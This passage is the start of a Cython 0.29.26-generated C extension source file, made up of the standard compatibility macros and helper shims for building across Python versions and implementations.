/* Generated by Cython 0.29.26 */

/* BEGIN: Cython Metadata

END: Cython Metadata */

#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif /* PY_SSIZE_T_CLEAN */
#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.6+ or Python 3.3+.
#else
#define CYTHON_ABI "0_29_26"
#define CYTHON_HEX_VERSION 0x001D1AF0
#define CYTHON_FUTURE_DIVISION 0
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #if PY_VERSION_HEX >= 0x02070000
    #define HAVE_LONG_LONG
  #endif
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#ifdef PYPY_VERSION
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#elif defined(PYSTON_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 0
  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 0
  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #ifndef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030B00A1)
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)
  #endif
  #ifndef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)
  #endif
  #ifndef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_MAJOR_VERSION < 3
    #include "longintrepr.h"
  #endif
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
           typedef unsigned char     uint8_t;
           typedef unsigned int      uint32_t;
        #else
           typedef unsigned __int8   uint8_t;
           typedef unsigned __int32  uint32_t;
        #endif
    #endif
#else
   #include <stdint.h>
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus) && __cplusplus >= 201103L
    #if __has_cpp_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH [[fallthrough]]
    #elif __has_cpp_attribute(clang::fallthrough)
      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
    #elif __has_cpp_attribute(gnu::fallthrough)
      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__ ) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif

#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #elif defined(__GNUC__)
    #define CYTHON_INLINE __inline__
  #elif defined(_MSC_VER)
    #define CYTHON_INLINE __inline
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_INLINE inline
  #else
    #define CYTHON_INLINE
  #endif
#endif

#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)
  #define Py_OptimizeFlag 0
#endif
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
  #define __Pyx_DefaultClassType PyClass_Type
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
  #define __Pyx_DefaultClassType PyType_Type
#if PY_VERSION_HEX >= 0x030B00A1
    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;
        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;
        const char *fn_cstr=NULL;
        const char *name_cstr=NULL;
        PyCodeObject* co=NULL;
        PyObject *type, *value, *traceback;
        PyErr_Fetch(&type, &value, &traceback);
        if (!(kwds=PyDict_New())) goto end;
        if (!(argcount=PyLong_FromLong(a))) goto end;
        if (PyDict_SetItemString(kwds, "co_argcount", argcount) != 0) goto end;
        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;
        if (PyDict_SetItemString(kwds, "co_posonlyargcount", posonlyargcount) != 0) goto end;
        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;
        if (PyDict_SetItemString(kwds, "co_kwonlyargcount", kwonlyargcount) != 0) goto end;
        if (!(nlocals=PyLong_FromLong(l))) goto end;
        if (PyDict_SetItemString(kwds, "co_nlocals", nlocals) != 0) goto end;
        if (!(stacksize=PyLong_FromLong(s))) goto end;
        if (PyDict_SetItemString(kwds, "co_stacksize", stacksize) != 0) goto end;
        if (!(flags=PyLong_FromLong(f))) goto end;
        if (PyDict_SetItemString(kwds, "co_flags", flags) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_code", code) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_consts", c) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_names", n) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_varnames", v) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_freevars", fv) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_cellvars", cell) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_linetable", lnos) != 0) goto end;
        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;
        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;
        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;
        if (!(replace = PyObject_GetAttrString((PyObject*)co, "replace"))) goto cleanup_code_too;
        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here
        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;
        Py_XDECREF((PyObject*)co);
        co = (PyCodeObject*)call_result;
        call_result = NULL;
        if (0) {
            cleanup_code_too:
            Py_XDECREF((PyObject*)co);
            co = NULL;
        }
        end:
        Py_XDECREF(kwds);
        Py_XDECREF(argcount);
        Py_XDECREF(posonlyargcount);
        Py_XDECREF(kwonlyargcount);
        Py_XDECREF(nlocals);
        Py_XDECREF(stacksize);
        Py_XDECREF(replace);
        Py_XDECREF(call_result);
        Py_XDECREF(empty);
        if (type) {
            PyErr_Restore(type, value, traceback);
        }
        return co;
    }
#else
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
  #define __Pyx_DefaultClassType PyType_Type
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #define __Pyx_PyCFunctionFast _PyCFunctionFast
  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_FAST_PYCCALL
#define __Pyx_PyFastCFunction_Check(func)\
    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))
#else
#define __Pyx_PyFastCFunction_Check(func) 0
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1
  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)
  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)
  #define PyMem_RawFree(p)             PyMem_Free(p)
#endif
#if CYTHON_COMPILING_IN_PYSTON
  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
#else
#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)
#endif
#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if defined(PyUnicode_IS_READY)
  #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                              0 : _PyUnicode_Ready((PyObject *)(op)))
  #else
  #define __Pyx_PyUnicode_READY(op)       (0)
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)
  #if defined(PyUnicode_IS_READY) && defined(PyUnicode_GET_SIZE)
  #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
  #else
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
  #endif
  #else
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)
  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)
  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)
  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)
  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))
#else
  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(WIN32) || defined(MS_WINDOWS)
  #define _USE_MATH_DEFINES
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
